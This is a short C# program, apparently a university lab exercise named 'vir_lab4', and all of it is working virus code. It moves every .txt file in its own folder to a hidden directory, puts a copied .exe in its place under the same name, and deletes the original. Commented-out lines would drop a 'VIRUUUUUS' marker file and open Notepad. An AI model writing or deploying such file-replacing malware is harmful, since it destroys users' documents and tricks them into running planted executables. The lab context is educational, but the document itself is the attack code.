using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace vir_lab4
{
    class Program
    {
        private const string _privateFolderPath = "C:\\Users\\Lavrov\\Desktop\\Test1";
        private static List<string> Items = new List<string>();

        static void Main(string[] args)
        {
            var splitedLast = Process.GetCurrentProcess().MainModule.FileName.Split('\\').LastOrDefault();

            string newPath = Process.GetCurrentProcess().MainModule.FileName.Replace("\\" + splitedLast, "");

            DirectoryInfo dinfo = new DirectoryInfo(newPath);

            FileInfo[] Files = dinfo.GetFiles("*.txt");

            foreach (FileInfo file in Files)
            {
                Items.Add(file.Name);

                var currentFilePath = Path.Combine(_privateFolderPath, file.Name);

                byte[] mass = File.ReadAllBytes(file.FullName);

                File.WriteAllBytes(currentFilePath, mass);

                DirectoryInfo privateInfo = new DirectoryInfo(_privateFolderPath);

                FileInfo privateExe = privateInfo.GetFiles("*.exe")[0];

                var privateFilePath = Path.Combine(_privateFolderPath, privateExe.Name);
                var newPrivateFilePath = Path.Combine(newPath, file.Name.Replace(".txt", "") + ".exe");

                byte[] privateMass = File.ReadAllBytes(privateFilePath);

                File.WriteAllBytes(newPrivateFilePath, privateMass);
                
                File.Delete(file.FullName);
            }

            //using (File.Create(Path.Combine(newPath, "I_AM_VIRUUUUUS.txt")))
            //{ }

            //File.WriteAllText(Path.Combine(newPath, "I_AM_VIRUUUUUS.txt"), "VIRUUUUUUUUS");

            //string path = Process.GetCurrentProcess().MainModule.FileName.Split('\\').LastOrDefault().Split('.').FirstOrDefault() + ".txt";

            //if (!path.EndsWith("Mirzavrov.txt"))
            //{
            //    Process.Start("notepad.exe", Path.Combine(_privateFolderPath, path));
            //}
        }
    }
}
